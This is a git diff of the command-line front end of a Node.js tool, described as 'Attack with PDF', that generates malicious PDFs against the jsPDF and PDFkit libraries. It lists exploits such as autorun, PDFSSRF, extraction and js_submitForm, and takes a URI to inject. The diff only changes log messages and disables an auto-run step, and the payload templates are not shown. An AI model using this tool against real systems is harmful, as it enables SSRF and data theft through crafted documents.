@@ -6,7 +6,7 @@ var kill = require('tree-kill');
 
 const parser = new ArgumentParser({
   description: 'Attack with PDF',
-  usage: " node main.js -l,--lib [jsPDF|PDFkit [-L,--list]] -e,--exploit [-o,--output] [-u,--URI] \n\t"+
+  usage: " node main.js -l,--lib {jsPDF|PDFkit [-L,--list]} -e,--exploit [-o,--output] [-u,--URI] \n\t"+
   chalk.blue("- [ Basic Examples ] -\n\t")+
   "Attack-Mode  | Library | Example command\n\t" +
   "=============+========================================================\n\t"+
@@ -27,19 +27,19 @@ parser.add_argument('-u', '--uri', { help: 'Specify URI to inject/SSRF'});
 
 
 function list_jsPDF_exploits(){
-	console.log('Avaliable exploits are: \nautorun \nsimple_js \nredirection \nPDFSSRF (somewhat stealthy) \nextraction (somewhat stealthy)')
+	console.log('Avaliable exploits for', chalk.blueBright('jsPDF'), 'are: \n\tautorun \n\tsimple_js \n\tredirection \n\tPDFSSRF (somewhat stealthy) \n\textraction (somewhat stealthy)')
 }
 
 
 function list_PDFkit_exploits(){
-	console.log('Avaliable exploits are: js_submitForm')
+	console.log('Avaliable exploits for', chalk.blueBright('PDFkit'), 'are: \n\tjs_submitForm')
 }
 
 
 function checkArgs(myArgs){
 	if (myArgs.lib){
 		if(myArgs.lib !== "jsPDF" && myArgs.lib !== "PDFkit"){
-			console.log("Unknown library, please run -l [jsPDF|PDFkit] -L to list out avaliable exploits")
+			console.log(chalk.redBright("[!] Unknown library, please run -l [jsPDF|PDFkit] -L to list out avaliable exploits"))
 			return 0
 		}
 		// pass lib check, continue with other checks
@@ -54,7 +54,7 @@ function checkArgs(myArgs){
 		}else if (myArgs.lib == 'PDFkit'){
 			list_PDFkit_exploits()
 		} else {
-			console.log("Unknown library")
+			console.log(chalk.redBright("[!] Unknown library, please run -l [jsPDF|PDFkit] -L to list out avaliable exploits"))
 		}
 		return 0
 	}
@@ -86,7 +86,7 @@ async function createExploit(vuln_lib, exploit, outname, direction='http://20.21
 		'extraction': template_jsPDF.bake_extraction}
 		if (jsPDF_dict.hasOwnProperty(exploit)){
 			// console.log(template_jsPDF)
-			console.log("[*] Generating " + exploit + " ....");
+			console.log("[*] Generating", exploit, "...");
 			template_status = jsPDF_dict[exploit](outname, direction)
 			if (template_status[1] == 1){
 				if(template_status.length == 3){
@@ -95,7 +95,7 @@ async function createExploit(vuln_lib, exploit, outname, direction='http://20.21
 					return [1, "[+] Finished bake " + chalk.yellowBright(exploit) + ", saved to " + chalk.yellowBright(template_status[0]), template_status[0]]			
 				}
 			} else {			
-				return [-1, chalk.red("[-] Failed to bake" + exploit)] 
+				return [-1, chalk.red("[!] Failed to bake" + exploit)] 
 			}
 		} else {
 			return [-1, chalk.red("[!] Invalid exploit, run the command node main.js -l jsPDF -L for avaliable exploits")] 
@@ -108,7 +108,7 @@ async function createExploit(vuln_lib, exploit, outname, direction='http://20.21
 		const template_PDFkit = new PDFkit_template;
 		var PDFkit_dict = {'js_submitForm': template_PDFkit.js_submitForm} 
 		if (PDFkit_dict.hasOwnProperty(exploit) ){
-			console.log("[*] Generating " + exploit + " ....");
+			console.log("[*] Generating ", exploit, "...");
 			let get_myfile_status = new Promise((res, rej) => {
 	        	template_status = PDFkit_dict[exploit](outname, direction)
 				template_status.then(status => {
@@ -119,7 +119,7 @@ async function createExploit(vuln_lib, exploit, outname, direction='http://20.21
 						message = [1, "[+] Finished bake " + chalk.cyan(exploit) + ", saved to " + chalk.cyan(status[0]), status[0]]			
 					}
 				}else {			
-					message = [-1, chalk.red("[-] Failed to bake" + exploit)] 
+					message = [-1, chalk.red("[!] Failed to bake" + exploit)] 
 				}
 				})
 		        setTimeout(() => res(message), 1000)
@@ -171,12 +171,12 @@ async function main(){
 
 	const myfile = await createExploit(vuln_lib, exploit, outname, direction)
 	console.log(chalk.greenBright(myfile[1]))
-	if(myfile[0] == 1){
-		console.log(chalk.redBright("[*] Spawning shell to run", myfile[2], "in 3 seconds ..."))
-		console.log("[!] Press ctrl + c to terminate")
-		await sleep(3000)
-		// test_exploit(myfile[2])
-	}
+	// if(myfile[0] == 1){
+	// 	console.log(chalk.redBright("[*] Spawning shell to run", myfile[2], "in 3 seconds ..."))
+	// 	console.log("[!] Press ctrl + c to terminate")
+	// 	await sleep(3000)
+	// 	// test_exploit(myfile[2])
+	// }
 }
 
 
